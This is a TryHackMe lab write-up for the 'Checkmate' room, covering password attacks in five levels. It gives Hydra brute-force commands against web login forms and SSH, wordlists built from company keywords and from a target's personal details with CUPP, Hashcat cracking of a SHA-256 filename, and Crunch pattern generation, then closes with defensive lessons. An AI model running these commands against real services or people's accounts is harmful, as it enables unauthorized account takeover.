---
type: writeup
platform: TryHackMe
room: Checkmate
os: Linux
environment: Password Attacks
last_verified: 2026-09-28

techniques:
  - password-brute-force
  - targeted-wordlists
  - osint
  - password-profiling
  - hash-cracking
  - password-pattern-analysis
  - ssh-brute-force

tools:
  - nmap
  - curl
  - hydra
  - cupp
  - wget
  - exiftool
  - hashcat
  - crunch
---
**Attack path:** Weak password → company keywords → personal-information wordlist → predictable hash → password pattern → SSH access

## 1. Environment Setup

The room used several hostnames mapped to the target through `/etc/hosts`:

```bash
<TARGET_IP> firewall.thm jobs.thm social.thm
```

Connectivity to the first application was verified with:

```bash
ping firewall.thm

nmap firewall.thm -p 5001
```

Relevant result:

```bash
5001/tcp open
```

The room then progressed through several password-attack scenarios, each demonstrating a different weakness in password selection or storage.

---

## 2. Level 1 — Weak Password

The first login application was exposed on:

```bash
http://firewall.thm:5001
```

A manual POST request confirmed the expected parameters and failure response:

```bash
curl -i -X POST http://firewall.thm:5001/login \
  -d "username=admin&password=test"
```

The request used:

```bash
username=admin
password=test
```

and invalid credentials returned:

```bash
Invalid credentials
```

This provided a reliable failure condition for Hydra.

A dictionary attack was then launched against the known `admin` account:

```bash
hydra -V -s 5001 \
  -l admin \
  -P /usr/share/wordlists/rockyou.txt \
  firewall.thm \
  http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

Hydra recovered a valid credential:

```bash
Username: admin
Password: <REDACTED>
```

The weakness at this stage was straightforward: the account used a password present in a common public wordlist.

---

## 3. Level 2 — Company Keyword Password

The second scenario targeted an employee login panel on:

```bash
http://jobs.thm:5002
```

The site content exposed several recurring company-related words:

```bash
Engineering
Innovation
Excellence
Security
Digital
Cloud
Future
Talent
MHT Labs
```

Instead of using a large generic wordlist, these public terms were used to create a small targeted list:

```bash
nano level2.txt
```

Example contents:

```bash
mht
labs
mhtlabs
engineering
careers
innovation
excellence
security
digital
cloud
future
talent
```

Hydra was then used against the known employee account:

```bash
hydra -V -f -t 4 \
  -s 5002 \
  -l marco \
  -P level2.txt \
  jobs.thm \
  http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

A valid password was recovered:

```bash
Username: marco
Password: <REDACTED>
```

This level demonstrates why organization-specific vocabulary is valuable during password attacks: public branding and company language can directly influence employee password choices.

---

## 4. Level 3 — Personal Information and OSINT

The third level relied on personal information rather than company terminology.

CUPP was used to generate a targeted password list:

```bash
git clone https://github.com/Mebus/cupp.git

python3 cupp.py -i
```

The profile information available for the target included:

```bash
First Name : Marco
Surname    : Bianchi
Nickname   : marky
Birthdate  : 14021995
```

The selected CUPP options were:

```bash
Keywords      : N
Special chars : Y
Random nums   : Y
Leet mode     : N
```

CUPP generated:

```bash
Saving dictionary to marco.txt
7400 words generated
```

This personalized wordlist was then tested against the login service:

```bash
hydra -l marco \
  -P marco.txt \
  -f -V -t 4 \
  social.thm \
  http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid" \
  -s 5003
```

A valid password was found:

```bash
Username: marco
Password: <REDACTED>
```

The important point is that the password was derived from information associated with the user. A relatively small targeted list was therefore more effective than blind guessing.

---

## 5. Level 4 — Predictable Hashed Filename

The page source exposed a comment referencing a profile picture:

```html
<!-- Post: Profile picture stored filename (Level 4) -->

/uploads/d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b.png
```

The filename looked like a SHA-256 digest.

The image was downloaded and inspected first:

```bash
wget http://social.thm:5003/uploads/d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b.png

file d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b.png
```

Result:

```bash
PNG image data, 1536 x 1024
```

Metadata analysis was also attempted:

```bash
exiftool d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b.png
```

No useful metadata was found.

Attention therefore shifted to the filename itself.

The digest was saved:

```bash
nano hash.txt
```

```bash
d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b
```

Hashcat was used in SHA-256 dictionary mode:

```bash
hashcat -m 1400 -a 0 \
  hash.txt \
  /usr/share/wordlists/rockyou.txt
```

Relevant options:

```bash
-m 1400   SHA-256
-a 0      Dictionary attack
```

The digest was successfully matched to a predictable plaintext value:

```bash
d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b:<REDACTED>
```

The lesson is not that SHA-256 itself was broken. The original value was predictable enough to be recovered through dictionary comparison.

---

## 6. Level 5 — Predictable Password Pattern

The final level disclosed the password-generation pattern directly:

```bash
I take a company keyword,
capitalize it,
append the year
and an exclamation mark.
```

Previously observed company keywords included:

```bash
security
excellence
innovation
digital
cloud
```

This reduced the search space significantly.

A candidate list was generated with Crunch:

```bash
crunch 13 13 -t Security20%%! -o pass_marco.txt
```

The pattern produced candidates such as:

```bash
Security2000!
Security2001!
...
Security2024!
...
Security2029!
```

In this Crunch pattern:

```bash
13 13   fixed password length
-t      custom pattern
%       numeric character [0-9]
```

The generated passwords were then tested against SSH:

```bash
hydra -l marco \
  -P pass_marco.txt \
  <TARGET_IP> \
  -t 4 \
  ssh
```

A valid SSH credential was recovered:

```bash
Username: marco
Password: <REDACTED>
```

The attack succeeded because the password-generation rule was predictable. Once the structure was known, the effective search space became very small.

---

## Key Takeaways

- Generic wordlists are effective against weak passwords, but targeted wordlists can be much more efficient when contextual information is available.
- Public company terminology can become password material and should therefore be considered during reconnaissance.
- Personal information collected through OSINT can be transformed into focused password candidates with tools such as CUPP.
- Hashing predictable data does not make that data unpredictable. Dictionary attacks can still recover low-entropy values.
- Password-generation rules can be as dangerous as password reuse. Once a pattern is known, tools such as Crunch can reduce a large password space to a small set of realistic candidates.
- Failed approaches can still guide the attack: in Level 4, image metadata produced no useful information, so analysis shifted to the hashed filename itself.